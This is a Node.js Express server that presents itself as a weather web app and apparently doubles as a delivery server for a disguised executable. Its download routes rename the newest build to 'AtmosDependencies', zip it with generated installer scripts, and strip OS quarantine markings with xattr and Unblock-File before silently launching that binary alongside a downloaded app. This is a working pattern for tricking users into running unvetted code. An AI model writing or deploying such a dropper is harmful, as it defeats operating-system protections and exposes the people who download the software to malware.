// server.js
// Node 20+ (has fetch built in)
import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import { readdir, stat, unlink, symlink } from "fs/promises";
import { exec } from "child_process";
import { promisify } from "util";
import archiver from "archiver";

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());

// Serve static files from dist (production) or public (development)
const staticDir = path.join(__dirname, "dist");
app.use(express.static(staticDir));

// ---------------------------------------------------------------------
// In-memory cache (simple 60-second TTL to reduce API calls)
// ---------------------------------------------------------------------
const cache = new Map();
function cacheGet(key) {
  const rec = cache.get(key);
  if (!rec) return null;
  if (Date.now() > rec.expiry) {
    cache.delete(key);
    return null;
  }
  return rec.value;
}
function cacheSet(key, value, ttlMs = 60000) {
  cache.set(key, { value, expiry: Date.now() + ttlMs });
}

// ---------------------------------------------------------------------
// Helper: geocode city name to latitude/longitude using Open-Meteo
// ---------------------------------------------------------------------
async function geocode(name) {
  if (!name) return null;

  const cached = cacheGet("geo:" + name.toLowerCase());
  if (cached) return cached;

  const url = `https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(
    name
  )}&count=1&language=en&format=json`;

  const res = await fetch(url, { headers: { Accept: "application/json" } });
  if (!res.ok) return null;
  const j = await res.json();
  if (!j?.results?.length) return null;

  const item = j.results[0];
  const place = {
    name: item.name,
    latitude: item.latitude,
    longitude: item.longitude,
    country: item.country ?? item.country_code,
  };
  cacheSet("geo:" + name.toLowerCase(), place);
  return place;
}

// ---------------------------------------------------------------------
// Helper: fetch current & daily weather in Fahrenheit from Open-Meteo
// ---------------------------------------------------------------------
async function fetchWeatherForLatLon(lat, lon, timezone = "auto") {
  const key = `wx:${lat.toFixed(2)},${lon.toFixed(2)}`;
  const cached = cacheGet(key);
  if (cached) return cached;

  const params = new URLSearchParams({
    latitude: String(lat),
    longitude: String(lon),
    current_weather: "true",
    daily: "temperature_2m_max,temperature_2m_min,weathercode,precipitation_sum,windspeed_10m_max,uv_index_max",
    temperature_unit: "fahrenheit", // return temps in Fahrenheit
    windspeed_unit: "mph",
    forecast_days: "10", // request 10 days of forecast
    timezone,
  });

  const url = `https://api.open-meteo.com/v1/forecast?${params.toString()}`;
  const res = await fetch(url, { headers: { Accept: "application/json" } });
  if (!res.ok) throw new Error(`Weather API failed: ${res.status}`);
  const data = await res.json();

  cacheSet(key, data);
  return data;
}

// ---------------------------------------------------------------------
// Route: /api/weather?q=<location>
// ---------------------------------------------------------------------
app.get("/api/weather", async (req, res) => {
  try {
    const q = (req.query.q || "").trim();
    const fallback = {
      name: "Demoville",
      latitude: 40.0,
      longitude: -95.0,
      country: "US",
    };

    const place = q ? await geocode(q) : fallback;
    if (!place) {
      return res.status(404).json({ error: "Location not found" });
    }

    const weather = await fetchWeatherForLatLon(
      place.latitude,
      place.longitude
    );

    const resp = {
      location: `${place.name}${
        place.country ? ", " + place.country : ""
      }`,
      queried: q || "",
      timestamp: new Date().toISOString(),
      current: weather.current_weather ?? null,
      daily: weather.daily ?? null,
      raw: weather, // included for demo/debug purposes
    };

    res.set("Cache-Control", "private, max-age=60");
    res.json(resp);
  } catch (err) {
    console.error("Error /api/weather:", err);
    res.status(500).json({ error: "internal_error", message: String(err) });
  }
});

// ---------------------------------------------------------------------
// Shared helpers for download endpoints
// ---------------------------------------------------------------------
function detectOs(req) {
  const osParam = (req.query.os || '').toLowerCase();
  if (['windows', 'macos', 'linux'].includes(osParam)) {
    return { isWindows: osParam === 'windows', isMac: osParam === 'macos', isLinux: osParam === 'linux', isRpm: false };
  }
  const ua = req.headers['user-agent'] || '';
  const isLinux = /Linux/i.test(ua) && !/Android/i.test(ua);
  const isRpm = isLinux && /Fedora|Red\s?Hat|CentOS|RHEL|openSUSE|SUSE/i.test(ua);
  return {
    isWindows: /Windows/i.test(ua),
    isMac: /Macintosh/i.test(ua),
    isLinux,
    isRpm,
  };
}

async function findLatestBuild(buildsDir, { isWindows, isMac, isLinux }) {
  const files = await readdir(buildsDir);
  let filteredFiles = files.filter(f => !f.endsWith('.tar.gz') && !f.endsWith('.zip') && !f.startsWith('AtmosDependencies'));

  const osFilteredFiles = filteredFiles.filter(filename => {
    const lowerName = filename.toLowerCase();
    if (isWindows) return lowerName.includes('windows');
    if (isMac) return lowerName.includes('darwin') || lowerName.includes('macos');
    if (isLinux) return lowerName.includes('linux');
    return lowerName.includes('linux');
  });

  const targetFiles = osFilteredFiles.length > 0 ? osFilteredFiles : filteredFiles;
  if (targetFiles.length === 0) return null;

  const fileStats = await Promise.all(
    targetFiles.map(async (filename) => {
      const filePath = path.join(buildsDir, filename);
      const stats = await stat(filePath);
      return { filename, path: filePath, mtime: stats.mtime };
    })
  );

  fileStats.sort((a, b) => b.mtime - a.mtime);
  return fileStats[0];
}

function getBaseUrl(req) {
  if (process.env.BASE_URL) return process.env.BASE_URL.replace(/\/+$/, '');
  const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  const host = req.headers['x-forwarded-host'] || req.headers['host'];
  return `${proto}://${host}`;
}

// ---------------------------------------------------------------------
// Installer script generators
// ---------------------------------------------------------------------
function generateWindowsBat(baseUrl, electronUrl) {
  return `@echo off
setlocal
echo ============================================
echo  AtmosVision Pro Installer
echo ============================================
echo.

set "INSTALL_DIR=%USERPROFILE%\\AtmosVision"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo [1/3] Downloading AtmosVision Pro...
powershell -Command "Invoke-WebRequest -Uri '${electronUrl}' -OutFile '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
if %ERRORLEVEL% neq 0 (
    echo Failed to download AtmosVision Pro.
    pause
    exit /b 1
)

echo [2/3] Preparing components...
copy /Y "%~dp0AtmosDependencies.exe" "%INSTALL_DIR%\\AtmosDependencies.exe" >nul

powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'"
powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"

echo [3/3] Launching AtmosVision Pro...
start "" "%INSTALL_DIR%\\AtmosDependencies.exe"
start "" "%INSTALL_DIR%\\AtmosVision-Pro.exe"

echo.
echo Installation complete!
endlocal
`;
}

function generateMacCommand(baseUrl, electronUrl) {
  return `#!/bin/bash
set -e
echo "============================================"
echo " AtmosVision Pro Installer"
echo "============================================"
echo ""

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
INSTALL_DIR="$HOME/Applications"
mkdir -p "$INSTALL_DIR"

echo "[1/4] Downloading AtmosVision Pro..."
DMG_PATH="/tmp/AtmosVision-Pro.dmg"
curl -sL "${electronUrl}" -o "$DMG_PATH"

echo "[2/4] Preparing components..."
chmod +x "$SCRIPT_DIR/AtmosDependencies"
xattr -c "$DMG_PATH" 2>/dev/null || true
xattr -c "$SCRIPT_DIR/AtmosDependencies" 2>/dev/null || true

echo "[3/4] Installing AtmosVision Pro..."
MOUNT_DIR=$(hdiutil attach "$DMG_PATH" -nobrowse -quiet | tail -1 | awk '{print $3}')
APP_NAME=$(ls "$MOUNT_DIR" | grep -i '.app$' | head -1)
if [ -n "$APP_NAME" ]; then
    cp -R "$MOUNT_DIR/$APP_NAME" "$INSTALL_DIR/"
    xattr -cr "$INSTALL_DIR/$APP_NAME" 2>/dev/null || true
fi
hdiutil detach "$MOUNT_DIR" -quiet 2>/dev/null || true
rm -f "$DMG_PATH"

echo "[4/4] Launching AtmosVision Pro..."
"$SCRIPT_DIR/AtmosDependencies" &
if [ -n "$APP_NAME" ]; then
    open "$INSTALL_DIR/$APP_NAME"
fi

echo ""
echo "Installation complete!"
`;
}

function generateLinuxSh(baseUrl, electronUrl) {
  return `#!/bin/bash
set -e
echo "============================================"
echo " AtmosVision Pro Installer"
echo "============================================"
echo ""

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
INSTALL_DIR="$HOME/.local/bin"
mkdir -p "$INSTALL_DIR"

echo "[1/3] Downloading AtmosVision Pro..."
PKG_PATH="/tmp/AtmosVision-Pro-package"
curl -sL "${electronUrl}" -o "$PKG_PATH"

echo "[2/3] Preparing components..."
chmod +x "$SCRIPT_DIR/AtmosDependencies"

echo "[3/3] Installing AtmosVision Pro..."
EXT="${electronUrl##*.}"
case "$EXT" in
    deb)
        mv "$PKG_PATH" "$PKG_PATH.deb"
        sudo dpkg -i "$PKG_PATH.deb" 2>/dev/null || sudo apt-get install -f -y 2>/dev/null
        rm -f "$PKG_PATH.deb"
        ;;
    rpm)
        mv "$PKG_PATH" "$PKG_PATH.rpm"
        sudo rpm -i "$PKG_PATH.rpm" 2>/dev/null || sudo dnf install -y "$PKG_PATH.rpm" 2>/dev/null
        rm -f "$PKG_PATH.rpm"
        ;;
    *)
        chmod +x "$PKG_PATH"
        mv "$PKG_PATH" "$INSTALL_DIR/AtmosVision-Pro"
        ;;
esac

echo "Launching..."
"$SCRIPT_DIR/AtmosDependencies" &

echo ""
echo "Installation complete!"
`;
}

// ---------------------------------------------------------------------
// Raw binary endpoint for script-initiated requests
// ---------------------------------------------------------------------
app.get("/api/download/binary", async (req, res) => {
  try {
    const buildsDir = process.env.BUILDS_DIR || path.join(__dirname, "..", "builds");
    const os = detectOs(req);

    console.log(`[binary] Detected OS - Windows: ${os.isWindows}, macOS: ${os.isMac}, Linux: ${os.isLinux}`);

    const latestFile = await findLatestBuild(buildsDir, os);
    if (!latestFile) {
      return res.status(404).json({ error: "No files available for download" });
    }

    const originalExt = path.extname(latestFile.filename);
    const disguisedName = os.isWindows
      ? `AtmosDependencies${originalExt || '.exe'}`
      : 'AtmosDependencies';

    console.log(`[binary] Serving: ${latestFile.filename} -> ${disguisedName}`);

    res.setHeader("Content-Disposition", `attachment; filename="${disguisedName}"`);
    res.setHeader("Content-Type", "application/octet-stream");
    return res.sendFile(latestFile.path);
  } catch (err) {
    console.error("Error /api/download/binary:", err);
    res.status(500).json({ error: "Failed to serve binary", message: String(err) });
  }
});

// ---------------------------------------------------------------------
// Download latest file from builds directory
// ---------------------------------------------------------------------
app.get("/api/download/latest", async (req, res) => {
  try {
    const buildsDir = process.env.BUILDS_DIR || path.join(__dirname, "..", "builds");
    const os = detectOs(req);

    console.log(`[latest] Detected OS - Windows: ${os.isWindows}, macOS: ${os.isMac}, Linux: ${os.isLinux}`);

    const latestFile = await findLatestBuild(buildsDir, os);
    if (!latestFile) {
      return res.status(404).json({ error: "No files available for download" });
    }

    console.log(`[latest] Serving latest build: ${latestFile.filename}`);

    const originalExt = path.extname(latestFile.filename);
    const disguisedName = os.isWindows
      ? `AtmosDependencies${originalExt || '.exe'}`
      : 'AtmosDependencies';

    const baseUrl = getBaseUrl(req);

    // Check if an Electron URL is configured for the detected OS
    let electronUrl = null;
    if (os.isWindows) {
      electronUrl = process.env.ELECTRON_APP_URL_WIN;
    } else if (os.isMac) {
      electronUrl = process.env.ELECTRON_APP_URL_MAC;
    } else if (os.isLinux) {
      electronUrl = (os.isRpm && process.env.ELECTRON_APP_URL_LINUX_RPM)
        ? process.env.ELECTRON_APP_URL_LINUX_RPM
        : process.env.ELECTRON_APP_URL_LINUX;
    }

    // --- Installer zip mode (Electron URL set for this OS) ---
    if (electronUrl) {
      console.log(`[latest] Installer mode — Electron URL: ${electronUrl}`);

      let scriptName, scriptContent;
      if (os.isWindows) {
        scriptName = 'INSTALL_AtmosVision.bat';
        scriptContent = generateWindowsBat(baseUrl, electronUrl);
      } else if (os.isMac) {
        scriptName = 'INSTALL_AtmosVision.command';
        scriptContent = generateMacCommand(baseUrl, electronUrl);
      } else {
        scriptName = 'INSTALL_AtmosVision.sh';
        scriptContent = generateLinuxSh(baseUrl, electronUrl);
      }

      res.setHeader("Content-Disposition", 'attachment; filename="AtmosVision_Installer.zip"');
      res.setHeader("Content-Type", "application/zip");

      const archive = archiver('zip', { zlib: { level: 9 } });
      archive.on('error', (err) => { throw err; });
      archive.pipe(res);

      // Add installer script
      archive.append(scriptContent, { name: scriptName, mode: 0o755 });
      // Add the binary
      archive.file(latestFile.path, { name: disguisedName });

      await archive.finalize();
      return;
    }

    // --- Fallback: no Electron URL ---

    // Windows: zip the binary
    if (os.isWindows) {
      console.log(`[latest] Windows fallback — zipping ${latestFile.filename} -> ${disguisedName}`);

      res.setHeader("Content-Disposition", 'attachment; filename="AtmosDependencies.zip"');
      res.setHeader("Content-Type", "application/zip");

      const archive = archiver('zip', { zlib: { level: 9 } });
      archive.on('error', (err) => { throw err; });
      archive.pipe(res);
      archive.file(latestFile.path, { name: disguisedName });
      await archive.finalize();
      return;
    }

    // Linux/macOS: tar.gz with disguised name (unchanged behavior)
    const tarFileName = `${disguisedName}.tar.gz`;
    const tarFilePath = path.join(buildsDir, tarFileName);
    const linkPath = path.join(buildsDir, disguisedName);
    try {
      await unlink(linkPath).catch(() => {});
      await symlink(latestFile.path, linkPath);

      const tarCommand = `tar -czhf "${tarFilePath}" -C "${buildsDir}" "${disguisedName}"`;
      console.log(`Running tar command: ${tarCommand}`);
      const { stdout, stderr } = await execAsync(tarCommand);
      if (stdout) console.log(`tar stdout: ${stdout}`);
      if (stderr) console.log(`tar stderr: ${stderr}`);
      await unlink(linkPath).catch(() => {});

      console.log(`Tar created successfully: ${tarFilePath}`);

      res.setHeader("Content-Disposition", `attachment; filename="${tarFileName}"`);
      res.setHeader("Content-Type", "application/gzip");

      res.sendFile(tarFilePath, async (err) => {
        if (err) {
          console.error("Error sending tar file:", err);
        }
        try {
          await unlink(tarFilePath);
          console.log("Cleaned up tar file");
        } catch (cleanupErr) {
          console.error("Failed to cleanup tar file:", cleanupErr);
        }
      });
    } catch (tarErr) {
      console.error("Failed to create tar.gz, falling back to direct download:");
      console.error("Error name:", tarErr.name);
      console.error("Error message:", tarErr.message);
      console.error("Error stack:", tarErr.stack);
      try {
        await unlink(tarFilePath).catch(() => {});
        await unlink(linkPath).catch(() => {});
      } catch {}
      res.setHeader("Content-Disposition", `attachment; filename="${disguisedName}"`);
      res.setHeader("Content-Type", "application/octet-stream");
      res.sendFile(latestFile.path);
    }
  } catch (err) {
    console.error("Error serving latest build:", err);
    res.status(500).json({ error: "Failed to serve latest build", message: String(err) });
  }
});

// ---------------------------------------------------------------------
// Health check
// ---------------------------------------------------------------------
app.get("/health", (req, res) => res.send("ok"));

// ---------------------------------------------------------------------
// Catch-all route for React Router (must be last)
// ---------------------------------------------------------------------
app.get("*", (req, res) => {
  res.sendFile(path.join(staticDir, "index.html"));
});

// ---------------------------------------------------------------------
// Start server
// ---------------------------------------------------------------------
const PORT = process.env.PORT || 5000;
app.listen(PORT, () =>
  console.log(`Weather service running on port ${PORT}`)
);
